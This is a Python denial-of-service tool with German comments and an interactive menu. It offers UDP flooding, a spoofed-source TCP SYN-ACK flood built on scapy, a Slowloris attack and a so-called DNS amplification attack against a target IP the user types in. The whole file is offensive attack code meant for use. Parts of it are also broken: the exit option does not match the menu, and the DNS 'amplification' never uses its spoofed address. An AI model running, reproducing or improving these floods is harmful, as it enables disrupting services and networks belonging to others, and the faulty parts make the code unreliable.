import os
import random
import socket
import threading
import time
import sys

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()

# Banner mit Anpassungsmöglichkeiten
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print("""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝██████╔╝██║   ██║█████╗  
██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝      ╚═════╝ ╚══════╝
    """)
    print("\033[0m")

# UDP Flood
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1
        except:
            pass

# TCP Flood
from scapy.all import *

def syn_ack_flood(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        # Gefälschte Quelle (kann zufällig sein)
        src_ip = RandIP()
        src_port = RandShort()
        
        # SYN-ACK Paket erstellen
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags='SA')  # SYN-ACK Flags
        packet = ip_layer / tcp_layer
        
        # Paket senden
        send(packet, verbose=False)

# Slowloris (TCP Keep-Alive)
def slowloris(ip, port):
    global packet_counter
    sockets = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sockets.append(sock)
        except:
            pass
    while not stop_event.is_set():
        for sock in sockets:
            try:
                sock.send(b"X-a: Keep-alive\r\n")
                packet_counter += 1
            except:
                sockets.remove(sock)

# DNS Amplification

def send_dns_query(ip, dns_query):
    """Sendet eine einzelne DNS-Anfrage an den angegebenen Server."""
    try:
        # UDP-Socket erstellen
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Zufällige Quell-IP simulieren (Spoofing ist hier theoretisch)
        spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
        # DNS-Anfrage senden
        sock.sendto(dns_query, (ip, 53))
    except Exception as e:
        print(f"Fehler beim Senden der Anfrage: {e}")
    finally:
        sock.close()

def attack_thread(ip, dns_query, duration):
    """Führt den Angriff in einem Thread aus."""
    end_time = time.time() + duration
    while time.time() < end_time:
        send_dns_query(ip, dns_query)

def dns_amplification_attack(ip, duration, threads):
    """
    Führt einen DNS-Amplification-Angriff aus.
    :param ip: Ziel-IP-Adresse (DNS-Server)
    :param duration: Dauer des Angriffs in Sekunden
    :param threads: Anzahl der Threads
    """
    # Beispiel DNS-Anfrage mit "ANY"-Typ, um große Antworten zu erzwingen
    dns_query = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x07example\x03com\x00\x00\xff\x00\x01")  # Typ "ANY"

    print(f"Start des DNS-Amplification-Angriffs auf {ip} für {duration} Sekunden mit {threads} Threads.")
    
    # Threads starten
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack_thread, args=(ip, dns_query, duration))
        thread_list.append(thread)
        thread.start()

    # Auf Threads warten
    for thread in thread_list:
        thread.join()

    print("Angriff beendet.")

# Menü zur Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

# Live-Dashboard
def dashboard():
    global packet_counter
    while not stop_event.is_set():
        print(f"\r[INFO] Gesendete Pakete: {packet_counter}", end="")
        time.sleep(1)

# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - UDP Flood")
        print("2 - TCP SYN-ACK Flood")
        print("3 - Slowloris Attack")
        print("4 - DNS Amplification")
        print("5 - Beenden")
        choice = input(" [ Wähle eine Option ] : ")

        if choice == "7":
            print("[INFO] Programm beendet.")
            sys.exit()

        if choice in ["1", "2", "3", "4"]:
            ip = input("Ziel-IP-Adresse: ")
            if choice not in ["3"]:  # Slowloris braucht keinen Port
                port = int(input("Ziel-Port: "))
            duration = int(input("Dauer des Angriffs (Sekunden): "))
            threads = int(input("Anzahl der Threads: "))

            stop_event.clear()

            # Angriffsfunktionen den Optionen zuordnen
            if choice == "1":
                attack_function = udp_flood
                args = (ip, port, 1024)  # UDP-Flood mit 1024 Bytes
            elif choice == "2":
                attack_function = syn_ack_flood
                args = (ip, port, duration)
            elif choice == "3":
                attack_function = slowloris
                args = (ip, port)
            elif choice == "4":
                attack_function = dns_amplification_attack
                args = (ip, duration, threads)

            # Threads starten
            attack_threads = [
                threading.Thread(target=attack_function, args=args)
                for _ in range(threads)
            ]
            for thread in attack_threads:
                thread.start()

            # Dashboard starten
            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()
